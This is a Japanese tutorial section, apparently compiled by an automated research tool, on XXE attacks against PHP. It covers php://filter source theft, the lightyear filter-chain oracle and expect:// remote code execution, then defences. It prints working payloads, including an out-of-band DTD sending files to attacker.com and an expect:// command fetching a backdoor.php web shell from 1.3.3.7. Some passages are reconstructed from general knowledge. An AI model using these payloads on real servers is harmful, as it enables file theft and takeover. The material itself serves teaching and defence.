## PHPフィルタチェーンとXXE→RCE

XXE（XML External Entity injection、XML外部実体注入）は入門段階では「`file:///etc/passwd` を読める脆弱性」として紹介される。しかし PHP アプリケーションを相手にすると、この攻撃は二つの方向へ大きく発展する。

1. **読み取り面の強化** — `php://filter` という PHP 独自のストリームラッパ（stream wrapper: ファイルを開くときに変換処理を挟み込める仕組み）を external entity の `SYSTEM` 先に指定し、**PHP ソースコードそのもの**を base64 で吸い出す。さらに、外部への通信もエラーメッセージも封じられた「一見不可能な（Impossible）」ブラインド環境でも、**PHP フィルタチェーン＋エラーベース・オラクル**を使って任意ファイルを 1 バイトずつ完全に復元できる（`lightyear` の技術）。
2. **実行面への飛躍（XXE→RCE）** — PHP に `expect` 拡張が読み込まれている場合、`expect://` ラッパを external entity にすると **OS コマンドが実行され、その標準出力が実体として展開**される。ファイル読み取り脆弱性が、そのまま任意コマンド実行（RCE: Remote Code Execution）へ化ける。

本節ではこの二つを、なぜそう動くのかという仕組みのレベルまで掘り下げる。

> ⚠️ **未取得の資料**: 本節が担当する 3 本の一次資料（Positive Technologies「Impossible XXE in PHP」／ Medium・Airman「From XXE to RCE with PHP/expect」／ Keiran Scott「Exploiting XXE Vulnerabilities」）は、いずれも実行環境の egress プロキシによりブロックされ（swarm.ptsecurity.com は TLS 証明書検証エラー、Medium は HTTP 403、keiran.scot は接続リセット）、直接取得できませんでした。以下のURLからご自身で直接ご覧ください。
> - https://swarm.ptsecurity.com/impossible-xxe-in-php/
> - https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
> - https://keiran.scot/2022/02/10/exploiting-xxe-vulnerabilities/
>
> （以下は、上記 3 本の要点を Web 検索の要約と、直接取得できた関連一次資料 — Lexfo による `lightyear` 技術解説ブログ、および PayloadsAllTheThings の XXE ペイロード集 — の実物、および一般知識に基づいて再構成した解説です。ペイロードは公開されている一次資料・OSS の実物を優先して引用しています。）

---

### 前提の復習：`php://filter` で「PHP ソース」を読む

通常の external entity でローカルファイルを読もうとすると、`<?php ... ?>` を含む PHP ファイルは XML パーサが `<` を解釈しようとして壊れたり、そもそもソースが実行されて出力しか返らなかったりする。そこで PHP 独自の `php://filter` を挟む。

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts><contact><name>Jean &xxe; Dupont</name></contact></contacts>
```

- `convert.base64-encode` は、読み込んだバイト列を **base64 に変換してから**エンティティに渡す。
- **なぜこれが要るのか**：base64 の出力は `A-Z a-z 0-9 + / =` だけなので、`<`, `>`, `&`, `<?php` といった「XML パーサやテンプレートを壊す文字」がすべて消える。結果として、PHP のソースコードでもバイナリでも、XML の実体値として安全に運べる。攻撃者は返ってきた base64 をローカルでデコードすればソースが手に入る。設定ファイルの DB 認証情報や秘密鍵の入手につながる。

> 出典: PayloadsAllTheThings — XXE Injection（php://filter base64 のペイロード） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

---

### エラーベース XXE と OOB XXE：ブラインドでも中身を取り出す

`&xxe;` の結果が画面に出ない「ブラインド XXE」では、外部 DTD（Document Type Definition: XML の文法・実体定義を書いた別ファイル）を攻撃者サーバに置き、**パラメータ実体**（`%name;` 形式、DTD 内でしか使えない実体）を入れ子にして中身を外へ運ぶ。

**帯域外（OOB: Out-Of-Band）exfiltration の基本形**：

```xml
<!-- 標的に送る XML -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://attacker.com/oob.dtd">
<data>&send;</data>
```

```xml
<!-- attacker.com/oob.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all  "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
%all;
```

- `%file` にファイルの base64 が入り、`%all` を評価すると「`send` という実体が `http://attacker.com/?（base64）` を指す」という定義が動的に作られる。標的が `&send;` を解決しようとして攻撃者サーバへ HTTP リクエストを飛ばし、URL のクエリに中身が乗って**流出**する。
- **なぜ base64 を挟むのか**：ファイル中の改行や `&`, `'` は、そのままだと URL や実体定義を壊す。base64 化で URL セーフな文字だけにして初めて安定して運べる。

**エラーベース XXE**（外部通信が塞がれ、しかしエラーメッセージは見える環境）：

```xml
<!-- attacker.com/ext.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file` の中身を、**存在しないパス**の一部として使う。パーサは `file:///nonexistent/root:x:0:0:...` を開こうとして失敗し、**エラーメッセージにファイル内容を丸ごと含めて**吐く。`&#x25;` は `%` の文字参照で、DTD 内でパラメータ実体を「今すぐ」ではなく「後で」定義させるための遅延評価テクニックである。

> 出典: PayloadsAllTheThings — XXE Injection（error-based / OOB DTD） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

---

### PHP フィルタチェーンと `lightyear`：オラクルだけで任意ファイルを 1 バイトずつ復元

ここからが本節の核心の一つ、Positive Technologies「Impossible XXE in PHP」が扱った**「一見不可能な」状況**である。想定するのは次のような最悪条件のブラインド XXE:

- **外部への通信ができない**（OOB が使えない）。
- **エラーメッセージのテキストが出ない**（エラーベースで中身が読めない）。
- しかも DOCTYPE を使うと必ずエラーになり、**成功時の 500 と失敗時の 500 が区別できない**。

一見「出力チャネルが皆無」に見える。しかし PHP には、出力の有無だけで 1 ビットを判定できる **エラーベース・オラクル（error-based oracle）** が作れる。これを支えるのが **PHP フィルタチェーン** である。

#### フィルタチェーンの原理

`php://filter/.../resource=FILE` の `...` 部分に、変換フィルタを `|`（パイプ）で何段も連結できる。

```
php://filter/convert.base64-encode|convert.iconv.UTF8.UTF16|.../resource=/etc/passwd
```

- `convert.iconv.X.Y` は文字エンコーディングを X→Y に変換する iconv フィルタ。**変換に失敗すると PHP は警告を出し、処理を中断する**。
- **なぜオラクルになるのか**：特定の文字集合の組み合わせでは、入力に「ある文字が含まれているとき**だけ**」変換エラーが起きる／起きない、という条件が作れる。つまり「エラーが出た＝ビット 1／出ない＝ビット 0」という**1 ビットの真偽値**を、通信もエラー本文も無しに、レスポンスの成否（空か非空か）だけから読み取れる。これがオラクル。

これを使い、ファイルを base64 化した文字列を先頭から 1 桁ずつ二分探索していけば、通信もエラー本文も無い環境で、任意ファイルの中身を復元できる。従来ツール（`php_filter_chains_oracle_exploit`）はこれを実装していたが、1 桁あたり 10 回以上のリクエストが必要で、しかも「135 番目の base64 桁を選ぶのに 7000 文字超のペイロード」といった巨大さが問題だった。

#### `lightyear` の改良点

Lexfo が公開した `lightyear` は、二つの発明でこれを実用化した。

1. **`dechunk` フィルタで“塊ごと”消す**：`dechunk` は HTTP チャンク転送エンコーディングを復号するフィルタ。`5\nABCDE\n3\nFGH\n0\n` のように「16 進サイズ＋データ」の形式を読むが、**サイズが不正だと残りを警告なしにまるごと捨てる**。この性質を使い、`convert.iconv` チェーンで base64 のある桁を `\n`（改行）に化けさせると、dechunk がその手前を一括除去できる。従来の「1 文字ずつずらす」方式に比べ、**206 桁ぶんの除去が 229 文字のペイロード**で済むほど小型化した。
2. **最適な二分探索で 1 バイト＝最大 6 リクエスト**：64 種の base64 桁集合をちょうど半分に割るフィルタ列を用意し、`convert.iconv.UTF16.UTF16|convert.quoted-printable-encode|convert.base64-decode` の結果が「有効な 16 進チャンクサイズか（＝空になるか／警告が出るか）」で 1 ビットを取る。log₂64 = 6 なので、**1 バイトあたり 6 リクエスト**に収まる（従来は 10 回以上）。

結果として、854 バイトの `/etc/passwd` を 30 秒未満・ペイロード 2000 バイト未満で吸い出せ、5 万バイト超のファイルすら GET リクエストの範囲で流出できたと報告されている。

> 出典: Lexfo's security blog — Introducing lightyear, a new way to dump PHP files — https://blog.lexfo.fr/lightyear-file-dump.html

#### 「Impossible XXE」が組み合わせたもの

Positive Technologies の研究は、この `lightyear` の **`dechunk` によるチャンク分割**を **XXE の文脈に持ち込んだ**点が新しい。XXE では XML パーサ（libxml）の制約が加わる。長すぎる実体はデフォルトで `XML_PARSE_HUGE` フラグ（巨大な実体を許可する明示フラグ）が無いと拒否される。ところが `lightyear` の `dechunk` はペイロードが最小で済むため、**`XML_PARSE_HUGE` が立っていない標準構成でも、数キロバイト規模のファイルを取り出せた**。「エラーテキストが出ず、DOCTYPE エラーで 500 の区別すらつかない」という、従来なら攻略不能と諦めるブラインド XXE を、フィルタチェーン・オラクルとチャンク分割の組み合わせで攻略できることを示したのが、この研究の結論である。

> ⚠️ **未取得の資料**: 「Impossible XXE in PHP」（Positive Technologies / PT SWARM）は自動取得できませんでした（理由: swarm.ptsecurity.com への接続が TLS 証明書検証エラーで失敗）。以下のURLからご自身で直接ご覧ください: https://swarm.ptsecurity.com/impossible-xxe-in-php/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この研究は 2024 年に公開され、PortSwigger の「Top 10 web hacking techniques of 2024」候補にも挙がった。防御側の教訓は明確で、「エラーも OOB も塞いだからブラインド XXE は安全」という前提は成り立たない。**そもそも DTD 処理・external entity・`php://filter` を無効化すること**（後述）以外に確実な対策はない。

---

### `expect://` による XXE→RCE：ファイル読み取りが任意コマンド実行に化ける

XXE のインパクトを最大化するのが `expect` 拡張である。Airman「From XXE to RCE with PHP/expect」と Keiran Scott の記事が扱うのはこの一手だ。

#### 仕組み

`expect` は PHP の PECL 拡張で、読み込まれると `expect://` というストリームラッパを登録する。`expect://コマンド` を `fopen` 等で開くと、PHP は**シェル経由でそのコマンドを実行し、標準出力（stdout）をストリームの中身として返す**。external entity の `SYSTEM` 先にこれを置くと、実体展開の瞬間にコマンドが走る。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "expect://id" >
]>
<creds>
  <user>&xxe;</user>
  <pass>mypass</pass>
</creds>
```

- `&xxe;` の解決時に `id` コマンドが実行され、レスポンス中の `<user>` 位置に `uid=0(root) gid=0(root) groups=0(root)` のような**コマンド出力**が返る。ファイル読み取り脆弱性が、その場で RCE に変わる瞬間である。

> 出典: PayloadsAllTheThings — XXE Injection / XXE PHP Wrapper（expect://id） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20PHP%20Wrapper.xml

#### 実務上の落とし穴：空白の扱い（`$IFS` トリック）

Airman の記事の「Missing Link（つながっていなかった環）」がここだ。`expect://` の先に `curl -O http://...` のような**空白を含むコマンド**を渡そうとすると、素直には通らない。

- **なぜ通らないか**：external entity の URI 内で空白を URL エンコード（`%20`）すると、`expect` はそれをコマンドの一部としてリテラルに扱ってしまい意図通り分割されない。かといって XML の文字参照（`&#x20;` や `&#32;`）で空白を書いても、**実体宣言の `SYSTEM` 値の中では文字参照が展開されない**ため機能しない。つまり「素の空白は XML を壊しかねず、エンコードは効かない」という板挟みになる。
- **回避策**：シェルの組み込み変数 `$IFS`（Internal Field Separator: 既定で空白・タブ・改行）を空白の代わりに使う。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'"> ]>
<root>
  <name>Joe</name>
  <tel>ufgh</tel>
  <email>START_&file;_END</email>
  <password>kjh</password>
</root>
```

- `curl$IFS-O$IFS'...'` はシェルで `curl -O '...'` として解釈される。`$IFS` が空白の代役を果たすので、URI に生の空白を書かずに済む。この例では攻撃者サーバから `backdoor.php` を取得して設置している（Web シェル設置の典型パターン）。

> ⚠️ **未取得の資料**: 「From XXE to RCE with PHP/expect — The Missing Link」（Medium / Airman、2019 年 6 月公開）は自動取得できませんでした（理由: Medium が HTTP 403 を返却）。以下のURLからご自身で直接ご覧ください: https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
>
> （以下は未取得資料の補足として一般知識に基づく解説です）記事は `xxelab`（XXE 学習用の PHP アプリ）を題材に、`expect://` の URI 内で「URL エンコードも XML 文字参照も効かない」問題を検証し、`$IFS` による空白回避を「見落とされていた最後の環（the missing link）」として提示している。

#### 前提：`expect` 拡張が読み込まれているか

この一手には強い前提がある。

- `expect` は**デフォルトでは無効**の PECL 拡張であり、意図的に `php.ini` で `extension=expect.so` を有効化した環境でしか使えない。
- また `expect` 拡張は保守が滞り、**PHP 7 系では正式サポートされていない**（PHP 5 系や古い構成でしか実際には動かないことが多い）。
- したがって「XXE があれば必ず RCE」ではなく、**`expect` が載っている限定的な環境でのみ成立する**。防御診断では「expect の有無」を確認項目にすると良い。逆に言えば、expect が無くても前述の `php://filter`＋`lightyear` でソースや秘密情報は抜けるため、「RCE でないから軽微」とは言えない。

> ⚠️ **未取得の資料**: 「Exploiting XXE Vulnerabilities」（Keiran Scott、2022-02-10）は自動取得できませんでした（理由: keiran.scot への接続がリセットされた）。以下のURLからご自身で直接ご覧ください: https://keiran.scot/2022/02/10/exploiting-xxe-vulnerabilities/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この記事は XXE の実践的解説として、ローカルファイル読み取り → SSRF（Server-Side Request Forgery: サーバに任意先へリクエストさせる）→ ブラインド／エラーベース XXE → `php://filter` によるソース奪取 → `expect://` による RCE、という段階的な攻撃面を通しで扱う構成である。RCE の要は前述のとおり `expect` 拡張の有無に依存する点が繰り返し強調される。

---

### 防御（本節のスコープ：防御目的）

本節の攻撃はいずれも「XML パーサが external entity と危険なストリームラッパを処理してしまう」ことに根がある。防御は入力側で断つ。

1. **DTD と外部実体を全面無効化する**（最優先・最重要）。libxml ベースの PHP では、パーサ設定で外部実体解決を止める。
   ```php
   // PHP: DTD・外部実体の読み込みを止める
   libxml_set_external_entity_loader(function () { return null; });
   $dom = new DOMDocument();
   $dom->loadXML($xml, LIBXML_NONET | LIBXML_DTDLOAD & 0); // ネットワーク禁止、DTD をロードしない
   ```
   - `LIBXML_NONET` で DTD/実体のネットワーク取得を禁止し、`libxml_set_external_entity_loader` で外部実体ローダを無効化する。これで `file://`, `http://`, `php://filter`, `expect://` いずれの external entity も解決されなくなり、ファイル読み取り・OOB・フィルタチェーン・RCE がまとめて塞がる。
   - 補足: 古い PHP では `libxml_disable_entity_loader(true)` が使われたが、これは PHP 8.0 で非推奨・実質無効化された（libxml 2.9 以降は既定で外部実体を読まないため）。新規コードは上記のローダ無効化を用いる。
2. **危険なストリームラッパを載せない**。`expect` 拡張は本番に入れない。`php://filter` を業務で使わないなら、可能な範囲で利用を制限・監査する。
3. **XML より安全な形式を選ぶ**。外部からの構造化データ入力は、DTD 概念を持たない JSON 等に置き換えられるなら置き換える。どうしても XML なら、スキーマ検証はパーサの実体解決を有効にしないライブラリ・設定で行う。
4. **多層防御**。アプリからの外向き通信（egress）を制限すれば OOB exfiltration を鈍らせられる。ただし本節冒頭の「Impossible XXE」が示すとおり、通信もエラーも塞いでもフィルタチェーン・オラクルは残るため、**根本対策はあくまで external entity の無効化**である点を忘れてはならない。
